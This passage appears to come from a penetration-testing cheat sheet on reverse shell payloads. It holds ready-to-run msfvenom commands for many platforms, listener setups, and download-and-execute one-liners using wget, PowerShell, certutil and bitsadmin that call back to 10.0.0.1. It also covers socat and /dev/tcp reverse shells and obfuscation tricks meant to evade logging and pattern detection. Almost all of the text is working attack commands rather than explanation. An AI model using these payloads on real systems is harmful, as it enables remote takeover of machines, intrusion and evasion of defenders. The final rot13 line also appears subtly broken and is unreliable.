  - Network: Requires ONE connection (callback only)
  - Stealth: Worse (full payload visible on disk, larger signature surface)
  - Reliability: Higher (no second stage dependency)
  - Use when: Strict egress filtering, need reliability, simple listener
```

### Generation Examples

```bash
# Staged payloads (forward slash in transport name)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o staged.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o staged.elf
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o staged.py

# Stageless payloads (underscore in transport name)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o stageless.exe
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o stageless.elf
msfvenom -p python/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o stageless.py

# Size comparison
ls -la staged.exe stageless.exe
# staged.exe: ~73KB    stageless.exe: ~200KB+
```

### Listener Configuration for Each Type

```bash
# For staged payloads: multi/handler is required
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
  set LHOST 10.0.0.1; set LPORT 4444; \
  set ExitOnSession false; exploit -j"

# For stageless payloads: any TCP listener works
nc -lvnp 4444                    # Basic netcat
rlwrap nc -lvnp 4444            # With readline support
socat TCP-LISTEN:4444,fork FILE:`tty`,raw,echo=0  # With PTY

# For stageless meterpreter: multi/handler also works
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/x64/meterpreter_reverse_tcp; \
  set LHOST 10.0.0.1; set LPORT 4444; exploit"
```

---

## 15. Payload Delivery Methods

### Web Delivery (HTTP)

```bash
# Python HTTP server for payload hosting
python3 -m http.server 8080 --directory /tmp/payloads/

# Target download commands:
# Linux:
wget http://10.0.0.1:8080/shell.elf -O /tmp/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf

# Windows PowerShell:
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadFile('http://10.0.0.1:8080/shell.exe','$env:TEMP\s.exe');Start-Process $env:TEMP\s.exe"

# Windows certutil:
certutil -urlcache -split -f http://10.0.0.1:8080/shell.exe %TEMP%\s.exe && %TEMP%\s.exe

# Windows bitsadmin:
bitsadmin /transfer d http://10.0.0.1:8080/shell.exe %TEMP%\s.exe && %TEMP%\s.exe
```

### SMB Delivery

```bash
# Start SMB server with Impacket for payload delivery
impacket-smbserver share /tmp/payloads/ -smb2support

# Target downloads payload from SMB share:
# Windows: copy \\10.0.0.1\share\shell.exe %TEMP%\shell.exe && %TEMP%\shell.exe
# Or execute directly: \\10.0.0.1\share\shell.exe
```

### FTP Delivery

```bash
# Start FTP server for payload delivery
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21 --write

# Target downloads via FTP:
# Windows: ftp -s:ftp_commands.txt
# ftp_commands.txt:
# open 10.0.0.1
# anonymous
# anonymous
# binary
# get shell.exe %TEMP%\shell.exe
# bye
```

---

## 16. Cross-Platform Payload Reference

### Architecture-Specific Payloads

```bash
# Windows x86 (32-bit)
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -a x86 -f exe -o win32.exe

# Windows x64 (64-bit)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -a x64 -f exe -o win64.exe

# Linux x86
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -a x86 -f elf -o lin32.elf

# Linux x64
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -a x64 -f elf -o lin64.elf

# Linux ARM (Raspberry Pi, IoT devices)
msfvenom -p linux/armle/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -a armle -f elf -o arm.elf

# Linux MIPS (routers, embedded devices)
msfvenom -p linux/mipsle/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -a mipsle -f elf -o mips.elf

# macOS x64
msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -a x64 -f macho -o mac64.macho

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -o android.apk

# Java JAR (cross-platform)
msfvenom -p java/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f jar -o crossplatform.jar

# PHP (web application deployment)
msfvenom -p php/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php

# Python (cross-platform with interpreter)
msfvenom -p python/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.py

# Node.js
msfvenom -p nodejs/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.js

# ASPX (IIS web server)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f aspx -o shell.aspx

# JSP (Tomcat/JBoss)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.jsp

# WAR (Tomcat deploy)
msfvenom -p java/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f war -o shell.war
```

---

## 17. Reverse Shell Upgrade Techniques

### Full Stabilization Sequence

```bash
# After catching a raw reverse shell:

# Step 1: Spawn PTY with Python
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the shell (Ctrl+Z)

# Step 3: Configure terminal for raw mode
stty raw -echo; fg

# Step 4: Set terminal type
export TERM=xterm
stty rows 38 cols 136

# Alternative: One-line stabilization
# (run inside the raw shell)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then: Ctrl+Z -> stty raw -echo; fg -> Enter x2 -> export TERM=xterm
```

### Socat Full PTY Shell

```bash
# Attacker listener (provides full PTY):
socat TCP-LISTEN:4444,reuseaddr,fork FILE:`tty`,raw,echo=0

# Target connect-back (requests PTY):
socat TCP:10.0.0.1:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane

# Transfer socat to target if not present:
# On attacker: python3 -m http.server 8080
# On target: curl http://10.0.0.1:8080/socat -o /tmp/socat && chmod +x /tmp/socat
```

---

## 18. Payload Obfuscation Techniques

### PowerShell Obfuscation

```powershell
# Method 1: String concatenation
cmd /c "pow"&"er"&"sh"&"ell -nop -c ""IEX(Ne"&"w-Ob"&"ject Ne"&"t.WebC"&"lient).Down"&"loadStr"&"ing('http://10.0.0.1/s.ps1')"""

# Method 2: Environment variable manipulation
cmd /c "set p=powershell && %p% -nop -enc <BASE64>"

# Method 3: WMI execution (bypasses some command-line logging)
wmic process call create "powershell -nop -enc <BASE64>"

# Method 4: Using bash-style variable substitution (not available in cmd)
# Use PowerShell IEX with variable splitting instead:
powershell -nop -c "$s='Down';$l='loadString';IEX (New-Object Net.WebClient).$($s+$l)('http://10.0.0.1/s.ps1')"
```

### Bash Payload Obfuscation

```bash
# Variable substitution to break pattern matching
a="bash";b="-i";c=">&";d="/dev/tcp/10.0.0.1/4444";e="0>&1"
$a $b $c $d $e

# Base64 decode and execute
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=" | base64 -d | bash

# Hex encoding
echo -e "\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x31\x30\x2e\x30\x2e\x30\x2e\x31\x2f\x34\x34\x34\x34\x20\x30\x3e\x26\x31" | bash

# Using eval with encoded command
eval $(echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" | rot13)
```
